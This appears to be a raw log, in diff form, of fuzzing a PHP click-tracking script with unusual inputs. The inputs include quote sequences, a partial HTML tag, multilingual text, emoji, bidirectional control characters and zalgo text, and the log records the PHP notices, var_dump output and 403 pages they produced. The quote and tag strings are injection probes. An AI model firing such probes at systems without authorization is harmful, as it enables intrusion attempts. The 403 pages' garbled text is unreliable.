+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access /à¸à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹ à¸à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹ à¸à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹à¹
+on this server.</p>
+</body></html>
+=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "'"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "%22"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "''"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "%22%22"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "'%22'"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(14) "%22''''%22'%22"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(18) "%22'%22'%22''''%22"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(37) "%3Cfoo%20val=%E2%80%9Cbar%E2%80%9D%20"
+  [2]=>
+  string(3) "%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(37) "%3Cfoo%20val=%E2%80%9Cbar%E2%80%9D%20"
+  [2]=>
+  string(3) "%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(37) "%3Cfoo%20val=%E2%80%9Dbar%E2%80%9C%20"
+  [2]=>
+  string(3) "%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(23) "%3Cfoo%20val=%60bar'%20"
+  [2]=>
+  string(3) "%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(99) "%E7%94%B0%E4%B8%AD%E3%81%95%E3%82%93%E3%81%AB%E3%81%82%E3%81%92%E3%81%A6%E4%B8%8B%E3%81%95%E3%81%84"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(99) "%E3%83%91%E3%83%BC%E3%83%86%E3%82%A3%E3%83%BC%E3%81%B8%E8%A1%8C%E3%81%8B%E3%81%AA%E3%81%84%E3%81%8B"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(36) "%E5%92%8C%E8%A3%BD%E6%BC%A2%E8%AA%9E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%E9%83%A8%E8%90%BD%E6%A0%BC"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(93) "%EC%82%AC%ED%9A%8C%EA%B3%BC%ED%95%99%EC%9B%90%20%EC%96%B4%ED%95%99%EC%97%B0%EA%B5%AC%EC%86%8C"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(168) "%EC%B0%A6%EC%B0%A8%EB%A5%BC%20%ED%83%80%EA%B3%A0%20%EC%98%A8%20%ED%8E%B2%EC%8B%9C%EB%A7%A8%EA%B3%BC%20%EC%91%9B%EB%8B%A4%EB%A6%AC%20%EB%98%A0%EB%B0%A9%EA%B0%81%ED%95%98"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(90) "%E7%A4%BE%E6%9C%83%E7%A7%91%E5%AD%B8%E9%99%A2%E8%AA%9E%E5%AD%B8%E7%A0%94%E7%A9%B6%E6%89%80"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(45) "%EC%9A%B8%EB%9E%80%EB%B0%94%ED%86%A0%EB%A5%B4"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(84) "%F0%A0%9C%8E%F0%A0%9C%B1%F0%A0%9D%B9%F0%A0%B1%93%F0%A0%B1%B8%F0%A0%B2%96%F0%A0%B3%8F"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(162) "%F0%90%90%9C%20%F0%90%90%94%F0%90%90%87%F0%90%90%9D%F0%90%90%80%F0%90%90%A1%F0%90%90%87%F0%90%90%93%20%F0%90%90%99%F0%90%90%8A%F0%90%90%A1%F0%90%90%9D%F0%90%90%93"
+  [2]=>
+  string(516) "%F0%90%90%9D%F0%90%90%87%F0%90%90%97%F0%90%90%8A%F0%90%90%A4%F0%90%90%94%20%F0%90%90%92%F0%90%90%8B%F0%90%90%97%20%F0%90%90%92%F0%90%90%8C%20%F0%90%90%9C%20%F0%90%90%A1%F0%90%90%80%F0%90%90%96%F0%90%90%87%F0%90%90%A4%F0%90%90%93%F0%90%90%9D%20%F0%90%90%B1%F0%90%91%82%20%F0%90%91%84%20%F0%90%90%94%F0%90%90%87%F0%90%90%9D%F0%90%90%80%F0%90%90%A1%F0%90%90%87%F0%90%90%93%20%F0%90%90%8F%F0%90%90%86%F0%90%90%85%F0%90%90%A4%F0%90%90%86%F0%90%90%9A%F0%90%90%8A%F0%90%90%A1%F0%90%90%9D%F0%90%90%86%F0%90%90%93%F0%90%90%86"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(127) "%E8%A1%A8%E3%83%9D%E3%81%82A%E9%B7%97%C5%92%C3%A9%EF%BC%A2%E9%80%8D%C3%9C%C3%9F%C2%AA%C4%85%C3%B1%E4%B8%82%E3%90%80%F0%A0%80%80"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "%C8%BA"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "%C8%BE"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(135) "%E3%83%BD%E0%BC%BC%E0%BA%88%D9%84%CD%9C%E0%BA%88%E0%BC%BD%EF%BE%89%20%E3%83%BD%E0%BC%BC%E0%BA%88%D9%84%CD%9C%E0%BA%88%E0%BC%BD%EF%BE%89"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(53) "(%EF%BD%A1%E2%97%95%20%E2%88%80%20%E2%97%95%EF%BD%A1)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(52) "%EF%BD%80%EF%BD%A8(%C2%B4%E2%88%80%EF%BD%80%E2%88%A9"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(17) "__%EF%BE%9B(,_,*)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%E3%83%BB(%EF%BF%A3%E2%88%80%EF%BF%A3)%E3%83%BB:*:"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(128) "%EF%BE%9F%EF%BD%A5%E2%9C%BF%E3%83%BE%E2%95%B2(%EF%BD%A1%E2%97%95%E2%80%BF%E2%97%95%EF%BD%A1)%E2%95%B1%E2%9C%BF%EF%BD%A5%EF%BE%9F"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(135) ",%E3%80%82%E3%83%BB:*:%E3%83%BB%E3%82%9C%E2%80%99(%20%E2%98%BB%20%CF%89%20%E2%98%BB%20)%E3%80%82%E3%83%BB:*:%E3%83%BB%E3%82%9C%E2%80%99"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(89) "(%E2%95%AF%C2%B0%E2%96%A1%C2%B0%EF%BC%89%E2%95%AF%EF%B8%B5%20%E2%94%BB%E2%94%81%E2%94%BB)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(94) "(%EF%BE%89%E0%B2%A5%E7%9B%8A%E0%B2%A5%EF%BC%89%EF%BE%89%EF%BB%BF%20%E2%94%BB%E2%94%81%E2%94%BB"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(69) "%E2%94%AC%E2%94%80%E2%94%AC%E3%83%8E(%20%C2%BA%20_%20%C2%BA%E3%83%8E)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(47) "(%20%CD%A1%C2%B0%20%CD%9C%CA%96%20%CD%A1%C2%B0)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(22) "%C2%AF%5C_(%E3%83%84)_"
+  [2]=>
+  string(6) "%C2%AF"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(12) "%F0%9F%98%8D"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(24) "%F0%9F%91%A9%F0%9F%8F%BD"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(219) "%F0%9F%91%A8%E2%80%8D%F0%9F%A6%B0%20%F0%9F%91%A8%F0%9F%8F%BF%E2%80%8D%F0%9F%A6%B0%20%F0%9F%91%A8%E2%80%8D%F0%9F%A6%B1%20%F0%9F%91%A8%F0%9F%8F%BF%E2%80%8D%F0%9F%A6%B1%20%F0%9F%A6%B9%F0%9F%8F%BF%E2%80%8D%E2%99%82%EF%B8%8F"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(117) "%F0%9F%91%BE%20%F0%9F%99%87%20%F0%9F%92%81%20%F0%9F%99%85%20%F0%9F%99%86%20%F0%9F%99%8B%20%F0%9F%99%8E%20%F0%9F%99%8D"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(57) "%F0%9F%90%B5%20%F0%9F%99%88%20%F0%9F%99%89%20%F0%9F%99%8A"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(228) "%E2%9D%A4%EF%B8%8F%20%F0%9F%92%94%20%F0%9F%92%8C%20%F0%9F%92%95%20%F0%9F%92%9E%20%F0%9F%92%93%20%F0%9F%92%97%20%F0%9F%92%96%20%F0%9F%92%98%20%F0%9F%92%9D%20%F0%9F%92%9F%20%F0%9F%92%9C%20%F0%9F%92%9B%20%F0%9F%92%9A%20%F0%9F%92%99"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(156) "%E2%9C%8B%F0%9F%8F%BF%20%F0%9F%92%AA%F0%9F%8F%BF%20%F0%9F%91%90%F0%9F%8F%BF%20%F0%9F%99%8C%F0%9F%8F%BF%20%F0%9F%91%8F%F0%9F%8F%BF%20%F0%9F%99%8F%F0%9F%8F%BF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(432) "%F0%9F%91%A8%E2%80%8D%F0%9F%91%A9%E2%80%8D%F0%9F%91%A6%20%F0%9F%91%A8%E2%80%8D%F0%9F%91%A9%E2%80%8D%F0%9F%91%A7%E2%80%8D%F0%9F%91%A6%20%F0%9F%91%A8%E2%80%8D%F0%9F%91%A8%E2%80%8D%F0%9F%91%A6%20%F0%9F%91%A9%E2%80%8D%F0%9F%91%A9%E2%80%8D%F0%9F%91%A7%20%F0%9F%91%A8%E2%80%8D%F0%9F%91%A6%20%F0%9F%91%A8%E2%80%8D%F0%9F%91%A7%E2%80%8D%F0%9F%91%A6%20%F0%9F%91%A9%E2%80%8D%F0%9F%91%A6%20%F0%9F%91%A9%E2%80%8D%F0%9F%91%A7%E2%80%8D%F0%9F%91%A6"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(117) "%F0%9F%9A%BE%20%F0%9F%86%92%20%F0%9F%86%93%20%F0%9F%86%95%20%F0%9F%86%96%20%F0%9F%86%97%20%F0%9F%86%99%20%F0%9F%8F%A7"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(232) "0%EF%B8%8F%E2%83%A3%201%EF%B8%8F%E2%83%A3%202%EF%B8%8F%E2%83%A3%203%EF%B8%8F%E2%83%A3%204%EF%B8%8F%E2%83%A3%205%EF%B8%8F%E2%83%A3%206%EF%B8%8F%E2%83%A3%207%EF%B8%8F%E2%83%A3%208%EF%B8%8F%E2%83%A3%209%EF%B8%8F%E2%83%A3%20%F0%9F%94%9F"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(123) "%F0%9F%87%BA%F0%9F%87%B8%F0%9F%87%B7%F0%9F%87%BA%F0%9F%87%B8%20%F0%9F%87%A6%F0%9F%87%AB%F0%9F%87%A6%F0%9F%87%B2%F0%9F%87%B8"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(108) "%F0%9F%87%BA%F0%9F%87%B8%F0%9F%87%B7%F0%9F%87%BA%F0%9F%87%B8%F0%9F%87%A6%F0%9F%87%AB%F0%9F%87%A6%F0%9F%87%B2"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(72) "%F0%9F%87%BA%F0%9F%87%B8%F0%9F%87%B7%F0%9F%87%BA%F0%9F%87%B8%F0%9F%87%A6"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%EF%BC%91%EF%BC%92%EF%BC%93"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(18) "%D9%A1%D9%A2%D9%A3"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access /Ø«Ù ÙÙØ³ Ø³ÙØ·Øª ÙØ¨Ø§ÙØªØ­Ø¯ÙØ¯Ø, Ø¬Ø²ÙØ±ØªÙ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù Ø£Ù Ø¯ÙÙ. Ø¥Ø° ÙÙØ§Ø Ø§ÙØ³ØªØ§Ø± ÙØªÙØµÙØ¨ ÙØ§Ù. Ø£ÙÙÙ Ø§ÙØ·Ø§ÙÙØ§Ø Ø¨Ø±ÙØ·Ø§ÙÙØ§-ÙØ±ÙØ³Ø§ ÙØ¯ Ø£Ø®Ø°. Ø³ÙÙÙØ§ÙØ Ø¥ØªÙØ§ÙÙØ© Ø¨ÙÙ ÙØ§, ÙØ°ÙØ± Ø§ÙØ­Ø¯ÙØ¯ Ø£Ù Ø¨Ø¹Ø¯, ÙØ¹Ø§ÙÙØ© Ø¨ÙÙÙØ¯Ø§Ø Ø§ÙØ¥Ø·ÙØ§Ù Ø¹Ù Ø¥ÙÙ.
+on this server.</p>
+</body></html>
+=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(327) "%D7%91%D6%B0%D6%BC%D7%A8%D6%B5%D7%90%D7%A9%D6%B4%D7%81%D7%99%D7%AA,%20%D7%91%D6%B8%D6%BC%D7%A8%D6%B8%D7%90%20%D7%90%D6%B1%D7%9C%D6%B9%D7%94%D6%B4%D7%99%D7%9D,%20%D7%90%D6%B5%D7%AA%20%D7%94%D6%B7%D7%A9%D6%B8%D6%BC%D7%81%D7%9E%D6%B7%D7%99%D6%B4%D7%9D,%20%D7%95%D6%B0%D7%90%D6%B5%D7%AA%20%D7%94%D6%B8%D7%90%D6%B8%D7%A8%D6%B6%D7%A5"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(133) "%D7%94%D6%B8%D7%99%D6%B0%D7%AA%D6%B8%D7%94test%D8%A7%D9%84%D8%B5%D9%81%D8%AD%D8%A7%D8%AA%20%D8%A7%D9%84%D8%AA%D9%91%D8%AD%D9%88%D9%84"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "%EF%B7%BD"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "%EF%B7%BA"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(672) "%D9%85%D9%8F%D9%86%D9%8E%D8%A7%D9%82%D9%8E%D8%B4%D9%8E%D8%A9%D9%8F%20%D8%B3%D9%8F%D8%A8%D9%8F%D9%84%D9%90%20%D8%A7%D9%90%D8%B3%D9%92%D8%AA%D9%90%D8%AE%D9%92%D8%AF%D9%8E%D8%A7%D9%85%D9%90%20%D8%A7%D9%84%D9%84%D9%8F%D9%91%D8%BA%D9%8E%D8%A9%D9%90%20%D9%81%D9%90%D9%8A%20%D8%A7%D9%84%D9%86%D9%8F%D9%91%D8%B8%D9%8F%D9%85%D9%90%20%D8%A7%D9%84%D9%92%D9%82%D9%8E%D8%A7%D8%A6%D9%90%D9%85%D9%8E%D8%A9%D9%90%20%D9%88%D9%8E%D9%81%D9%90%D9%8A%D9%85%20%D9%8A%D9%8E%D8%AE%D9%8F%D8%B5%D9%8E%D9%91%20%D8%A7%D9%84%D8%AA%D9%8E%D9%91%D8%B7%D9%92%D8%A8%D9%90%D9%8A%D9%82%D9%8E%D8%A7%D8%AA%D9%8F%20%D8%A7%D9%84%D9%92%D8%AD%D8%A7%D8%B3%D9%8F%D9%88%D8%A8%D9%90%D9%8A%D9%8E%D9%91%D8%A9%D9%8F%D8%8C"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(99) "%D8%A7%D9%84%D9%83%D9%84%20%D9%81%D9%8A%20%D8%A7%D9%84%D9%85%D8%AC%D9%85%D9%88%20%D8%B9%D8%A9%20(5)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(135) "%E1%9A%9B%E1%9A%84%E1%9A%93%E1%9A%90%E1%9A%8B%E1%9A%92%E1%9A%84%E1%9A%80%E1%9A%91%E1%9A%84%E1%9A%82%E1%9A%91%E1%9A%8F%E1%9A%85%E1%9A%9C"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(171) "%E1%9A%9B%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%80%E1%9A%9C"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(31) "%E2%80%AA%E2%80%AAtest%E2%80%AA"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(22) "%E2%80%ABtest%E2%80%AB"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(22) "%E2%80%A9test%E2%80%A9"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(26) "test%E2%81%A0test%E2%80%AB"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(22) "%E2%81%A6test%E2%81%A7"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access /á¹°ÌºÌºÌoÍ Ì·iÌ²Ì¬ÍÌªÍnÌÌÍvÌÌÌÌ¦ÍoÌ¶ÌÌ°Ì kÃ¨ÍÌ®ÌºÌªÌ¹Ì±Ì¤ ÌtÌÍÌ³Ì£Ì»ÌªÍhÌ¼ÍÌ²Ì¦Ì³ÌÌ²eÍÌ£Ì°Ì¦Ì¬Í Ì¢Ì¼Ì»Ì±ÌhÍÍÍÌÌ£Ì²ÍiÌ¦Ì²Ì£Ì°Ì¤vÌ»ÍeÌºÌ­Ì³ÌªÌ°-mÌ¢iÍnÌÌºÌÌ²Ì¯Ì°dÌµÌ¼ÌÍÌ©Ì¼ÌÌ³ ÌÌ¥Ì±Ì³Ì­rÌÌÌeÍpÍ rÌ¼ÌÌ»Ì­ÌeÌºÌ Ì£ÍsÌÍÌ³ÍÌÍeÍÌ¥Ì¯ÌÌ²ÍÌ¬ÍÇ¹Ì¬ÍÍÌÌÍÌ¤tÍÌ¬Ì¤ÍÌ¼Ì­ÍÍiÌªÌ±nÍ gÌ´Í ÍÍÍcÌ¬ÌhÍ¡aÌ«Ì»Ì¯ÍoÌ«ÌÌÍÌÌÍsÌÌ¦Ì².Ì¨Ì¹ÍÌ£
+on this server.</p>
+</body></html>
+=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
